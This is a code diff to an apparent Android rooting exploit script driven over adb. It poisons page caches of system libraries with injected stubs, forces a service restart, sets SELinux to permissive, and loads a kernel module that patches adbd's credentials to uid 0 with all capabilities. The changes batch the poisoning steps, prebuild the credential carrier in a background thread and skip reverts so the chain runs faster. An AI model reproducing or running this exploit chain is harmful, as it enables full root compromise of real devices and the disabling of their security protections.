@@ -432,6 +432,27 @@ def poison(adb, dev_path, spec, tag, retries=8):
             import time as _t; _t.sleep(2)   # let a stale SA reap
     err(f"{tag} poison failed after {retries} attempts: ...{out[-160:]}"); sys.exit(1)
 
+def poison_batch(adb, items, retries=8):
+    # items = [(dev_path, spec, tag), ...] -> ONE Writer invocation (one JVM + one SA) for all files,
+    # avoiding per-poison JVM/SA startup. The Writer takes alternating (path, specpath) args.
+    args, total, tags = [], 0, []
+    for dev_path, spec, tag in items:
+        sp = os.path.join(BUILD, tag + ".spec"); open(sp, "wb").write(spec)
+        adb.push(sp, f"/data/local/tmp/{tag}.spec")
+        args += [dev_path, f"/data/local/tmp/{tag}.spec"]; total += len(spec) // 5; tags.append(tag)
+    out = ""
+    for attempt in range(1, retries + 1):
+        out = adb.sh("cd /data/local/tmp && CLASSPATH=e2e.dex app_process / q3.Writer " + " ".join(args))
+        m = re.search(r"wrote=(\d+) skipped=(\d+)", out)
+        if m and int(m.group(1)) + int(m.group(2)) == total:
+            info(f"{'+'.join(tags)}: wrote={m.group(1)} skipped={m.group(2)}" + (f"  ({attempt} tries)" if attempt > 1 else ""))
+            return
+        if attempt < retries:
+            exc = next((l.strip() for l in out.splitlines() if "[!]" in l or "Exception" in l or "Error" in l), "")
+            warn(f"batch writer incomplete (attempt {attempt}/{retries}) — retrying  [{exc[:200]}]")
+            import time as _t; _t.sleep(2)
+    err(f"batch poison failed after {retries} attempts: ...{out[-160:]}"); sys.exit(1)
+
 class Stager:
     def __init__(self, serial): self.serial = serial; self.p = None; self.port = None
     def start(self):
@@ -693,6 +714,19 @@ def run(target_path, device_override, cleanup, verify_root, settle, skip_magisk=
     adb.push(DEX, "/data/local/tmp/e2e.dex"); ok("pushed e2e.dex")
     disable_phantom(adb)
 
+    # adb-root builds the adbd cred carrier off the host (clang, ~1.2s). adbd's pid is stable, so
+    # start that build NOW in a thread to overlap the base chain; the adb-root branch joins it (and
+    # rebuilds only if adbd's pid changed meanwhile).
+    cred = {}
+    if cleanup == "adb-root":
+        cred["pid"] = adbd_pid(adb); cred["ko"] = os.path.join(BUILD, "uv.ko")
+        cred["cc"] = os.path.join(tdir, tgt["cred_carrier"]["local_ko"])
+        if cred["pid"]:
+            cred["args"] = credmod_args(tgt, cred["cc"], cred["pid"], cred["ko"], ctx=True)
+            cred["t"] = threading.Thread(target=lambda: cred.update(
+                r=subprocess.run(cred["args"], capture_output=True, text=True)))
+            cred["t"].start()
+
     banner("BUILD  (host)")
     step("Carrier .ko  (48-byte diff-injection, enforcing=0)")
     carrier_out, carrier_want = build_carrier(tgt, tdir)
@@ -714,18 +748,20 @@ def run(target_path, device_override, cleanup, verify_root, settle, skip_magisk=
     eva_stub_len = 0; orig_las = b""
     try:
         banner("POISON  (shell -> page caches)")
-        step("inject-lib stub  (init_array[0] -> 2-file poison stub in the gap)")
+        step("inject-lib + libandroid stubs  (batched: one SA/JVM, 2 files)")
         eva_raw, eva_spec, cnts = build_inject_stub(tgt, port,
             [(tgt["carrier"]["device_path"], carrier_cur, carrier_want),
              (tgt["cfg"]["device_path"], cfg_cur, cfg_want)])
         eva_stub_len = len(eva_raw)
-        info(f"stub {len(eva_raw)}B  (carrier IVs={cnts[0]}, cfg IVs={cnts[1]})  gap fits {inj(tgt)['stub_gap_size']}B")
-        poison(adb, inj(tgt)["device_path"], eva_spec, "inject")
-        step("libandroid_servers::dump stub  (-> ctl.restart trackingservice)")
         las_raw, las_spec = build_libas_stub(tgt)
-        orig_las = adb.read_region(tgt["libandroid_servers"]["device_path"],
-                                   hx(tgt["libandroid_servers"]["dump_off"]), len(las_raw))  # save for restore
-        poison(adb, tgt["libandroid_servers"]["device_path"], las_spec, "libas")
+        # orig libandroid bytes are only needed to REVERT later (postex/leave-disabled/reboot);
+        # adb-root/no-restore skip the revert, so skip this slow dd|base64 read.
+        if cleanup in ("postex", "leave-disabled", "reboot"):
+            orig_las = adb.read_region(tgt["libandroid_servers"]["device_path"],
+                                       hx(tgt["libandroid_servers"]["dump_off"]), len(las_raw))
+        info(f"inject stub {len(eva_raw)}B (carrier IVs={cnts[0]}, cfg IVs={cnts[1]}); libas {len(las_raw)}B")
+        poison_batch(adb, [(inj(tgt)["device_path"], eva_spec, "inject"),
+                           (tgt["libandroid_servers"]["device_path"], las_spec, "libas")])
 
         banner("TRIGGER  (shell)")
         tsvc = tgt["services"]["tracking"]; isvc = tgt["services"]["insmod_sh"]
@@ -733,8 +769,8 @@ def run(target_path, device_override, cleanup, verify_root, settle, skip_magisk=
         pid0 = adb.sh(f"pidof {tsvc}")
         adb.sh("dumpsys input >/dev/null 2>&1")
         pid1 = pid0
-        for _ in range(20):
-            time.sleep(1); pid1 = adb.sh(f"pidof {tsvc}")
+        for _ in range(60):
+            time.sleep(0.3); pid1 = adb.sh(f"pidof {tsvc}")
             if pid1 and pid1 != pid0: break
         if pid1 == pid0 or not pid1:
             err(f"{tsvc} did not restart (pid still {pid0}) — dump stub not hit"); return
@@ -864,10 +900,14 @@ def run(target_path, device_override, cleanup, verify_root, settle, skip_magisk=
         # real ctor — harmless. Skipping the two reverts saves ~8s. (--postex still reverts, for Magisk.)
         pid = adbd_pid(adb)
         if not pid: err("could not find adbd pid"); return
-        cc = os.path.join(tdir, tgt["cred_carrier"]["local_ko"]); credko = os.path.join(BUILD, "uv.ko")
+        cc = cred.get("cc") or os.path.join(tdir, tgt["cred_carrier"]["local_ko"]); credko = cred.get("ko") or os.path.join(BUILD, "uv.ko")
         ppath = "/data/local/tmp/uv.ko"
-        step(f"Diff-patching cred carrier ({os.path.basename(cc)}) -> adbd pid {pid} + uid0 + caps + kernel ctx")
-        r = subprocess.run(credmod_args(tgt, cc, pid, credko, ctx=True), capture_output=True, text=True)
+        step(f"Cred carrier ({os.path.basename(cc)}) -> adbd pid {pid} + uid0 + caps + kernel ctx")
+        r = None
+        if cred.get("t") and cred.get("pid") == pid:      # prebuilt in the background thread (adbd pid unchanged)
+            cred["t"].join(); r = cred.get("r")
+        if r is None or r.returncode:                     # no prebuild / adbd pid changed -> build now
+            r = subprocess.run(credmod_args(tgt, cc, pid, credko, ctx=True), capture_output=True, text=True)
         if r.returncode: err("build_credmod failed: " + r.stderr + r.stdout); return
         info(r.stdout.strip().split(": ", 1)[-1]); adb.push(credko, ppath)
         step("Poisoning init.insmod.cfg -> insmod uv.ko (shell, permissive)")
@@ -879,8 +919,8 @@ def run(target_path, device_override, cleanup, verify_root, settle, skip_magisk=
         step("ctl.start insmod_sh -> loads uv.ko -> cred-patch adbd")
         adb.sh("setprop ctl.start insmod_sh")
         rooted = False
-        for _ in range(20):
-            time.sleep(1)
+        for _ in range(40):
+            time.sleep(0.3)
             if adb.sh("id -u") == "0": rooted = True; break
         if not rooted: err("adb shell not root (uv.ko load failed?)"); return
         win(f"adbd (pid {pid}) cred-patched -> NEW adb shells are uid 0 + all caps + kernel context")
